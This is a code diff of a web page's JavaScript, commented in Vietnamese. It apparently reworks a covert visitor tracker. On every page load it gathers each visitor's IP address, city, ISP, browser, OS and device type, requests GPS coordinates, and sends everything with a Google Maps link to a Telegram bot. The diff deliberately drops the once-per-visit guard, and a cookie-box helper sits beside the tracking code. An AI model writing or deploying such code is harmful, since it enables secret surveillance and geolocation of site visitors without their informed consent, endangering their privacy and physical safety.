@@ -60,9 +60,9 @@ adjustZoom();
    // --- 1. CẤU HÌNH ---
 const TG_TOKEN = CONFIG.TG_TOKEN;
         const CHAT_ID = CONFIG.CHAT_ID;
-let hasSent = false; // Khóa chặn gửi trùng trong 1 lần load trang
+let isBotActive = false;
 
-// --- 2. NHẬN DIỆN CHI TIẾT THIẾT BỊ ---
+// --- 2. NHẬN DIỆN THIẾT BỊ ---
 function getDetailDevice() {
     const ua = navigator.userAgent;
     let browser = "Trình duyệt lạ";
@@ -85,35 +85,43 @@ function getDetailDevice() {
     return { browser, os, deviceType };
 }
 
-// --- 3. LẤY IP, THÀNH PHỐ, NHÀ MẠNG (HTTPS 100%) ---
-async function fetchIpInfo() {
-    // Thử các nguồn khác nhau để tránh N/A
+// --- 3. LẤY IP & NHÀ MẠNG (Dùng HTTPS ổn định cho sweep.id.vn) ---
+async function fetchIpData() {
     const apis = [
         {
+            // Nguồn 1: Rất chuẩn cho mạng Việt Nam (HTTPS OK)
             url: 'https://ipwho.is/',
-            parse: (d) => ({ ip: d.ip, city: d.city, isp: d.connection?.isp || d.org })
+            parse: (d) => ({ ip: d.ip, city: d.city, isp: d.connection?.isp || d.isp || d.org })
         },
         {
+            // Nguồn 2: Ổn định toàn cầu
             url: 'https://ipapi.co/json/',
             parse: (d) => ({ ip: d.ip, city: d.city, isp: d.org || d.asn_organization })
+        },
+        {
+            // Nguồn 3: Dự phòng Cloudflare (Chỉ lấy được IP, ISP mặc định)
+            url: 'https://api.db-ip.com/v2/free/self',
+            parse: (d) => ({ ip: d.ipAddress, city: d.city, isp: d.organization })
         }
     ];
 
     for (const api of apis) {
         try {
             const res = await fetch(api.url, { signal: AbortSignal.timeout(4000) });
-            const d = await res.json();
-            const result = api.parse(d);
-            if (result.ip && result.city && result.city !== "N/A") return result;
+            if (!res.ok) continue;
+            const data = await res.json();
+            const result = api.parse(data);
+            // Nếu lấy được ISP và IP thì trả về luôn
+            if (result.ip && result.isp) return result;
         } catch (e) { continue; }
     }
-    return { ip: "Không rõ", city: "Không rõ", isp: "Không rõ" };
+    return { ip: "Đang quét...", city: "Đang quét...", isp: "Đang quét..." };
 }
 
-// --- 4. HÀM GỬI THÔNG BÁO ---
+// --- 4. GỬI TELEGRAM (Mỗi lần vào gửi 1 tin) ---
 async function sendNotification(pos, ipInfo) {
-    if (hasSent) return; // Nếu đang trong quá trình gửi thì không chạy thêm
-    hasSent = true;
+    if (isBotActive) return; 
+    isBotActive = true;
 
     const device = getDetailDevice();
     const time = new Date().toLocaleString('vi-VN');
@@ -122,16 +130,15 @@ async function sendNotification(pos, ipInfo) {
     msg += `🕒 <b>Thời gian:</b> <code>${time}</code>\n`;
     msg += `🌐 <b>IP:</b> <code>${ipInfo.ip}</code>\n`;
     msg += `🏙️ <b>Thành phố:</b> <code>${ipInfo.city}</code>\n`;
-    msg += `📡 <b>Nhà mạng:</b> <b>${ipInfo.isp}</b>\n\n`;
-
-    msg += `ℹ️ <b>Thông tin thiết bị:</b>\n`;
+    msg += `📡 <b>Nhà mạng:</b> <b>${ipInfo.isp}</b>\n\n`;msg += `ℹ️ <b>Thông tin thiết bị:</b>\n`;
     msg += `├─ Loại: <b>${device.deviceType}</b>\n`;
     msg += `├─ Hệ điều hành: <code>${device.os}</code>\n`;
     msg += `└─ Trình duyệt: <b>${device.browser}</b>\n\n`;
 
     if (pos && pos.coords) {
         const { latitude: lat, longitude: lon } = pos.coords;
-        msg += `📍 <b>Vị trí GPS:</b>\n`;msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Nhấn để xem Bản đồ</a>\n`;
+        msg += `📍 <b>Vị trí GPS:</b>\n`;
+        msg += `└ 👉 <a href="https://www.google.com/maps?q=${lat},${lon}">Xem trên Bản đồ</a>\n`;
     }
 
     try {
@@ -144,30 +151,28 @@ async function sendNotification(pos, ipInfo) {
                 parse_mode: 'HTML'
             })
         });
-        console.log("Đã gửi thông báo về Bot.");
     } catch (err) {
-        console.error("Lỗi gửi Telegram:", err);
-        hasSent = false; // Reset nếu lỗi để có thể thử lại
+        console.error(err);
+    } finally {
+        isBotActive = false; // Mở khóa để lần sau vào lại vẫn gửi
     }
 }
 
 // --- 5. KHỞI CHẠY ---
 async function startTracking() {
-    // Chạy song song để tốc độ nhanh nhất
-    const ipPromise = fetchIpInfo();
-    const gpsPromise = new Promise(r => navigator.geolocation.getCurrentPosition(r, () => r(null), {timeout: 4000}));
-    
-    const [ipInfo, pos] = await Promise.all([ipPromise, gpsPromise]);
-    await sendNotification(pos, ipInfo);
+    const ipInfo = await fetchIpData();
+    // Lấy GPS (nếu người dùng cho phép)
+    navigator.geolocation.getCurrentPosition(
+        async (pos) => { await sendNotification(pos, ipInfo); },
+        async () => { await sendNotification(null, ipInfo); },
+        { timeout: 5000 }
+    );
 }
 
-// Luôn chạy khi load trang
-window.onload = () => {
-    // Xóa bỏ kiểm tra localStorage để lần nào vào cũng gửi tin
-    startTracking();
-};
+// Chạy ngay khi load trang
+window.onload = startTracking;
 
-// Nếu bạn vẫn muốn dùng nút Cookie để kích hoạt GPS
+// Hàm cho nút cookie (nếu có)
 function acceptCookies() {
     const box = document.getElementById('cookie-box');
     if (box) box.style.display = 'none';
